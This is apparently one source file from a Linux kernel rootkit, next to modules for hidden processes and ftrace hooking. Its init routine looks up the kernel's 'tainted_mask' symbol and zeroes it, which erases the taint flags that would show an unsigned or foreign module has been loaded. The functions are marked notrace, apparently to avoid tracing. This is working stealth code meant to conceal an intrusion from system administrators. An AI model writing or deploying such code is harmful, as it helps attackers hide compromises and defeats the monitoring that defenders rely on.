#include "../include/core.h"
#include "../include/reset_tainted.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

notrace int reset_tainted_init(void) {
    unsigned long *taint_mask_ptr = (unsigned long *)resolve_sym("tainted_mask");
    if (!taint_mask_ptr)
        return -EFAULT;
    
    *taint_mask_ptr = 0;

    return 0;
}

notrace void reset_tainted_exit(void) {
}
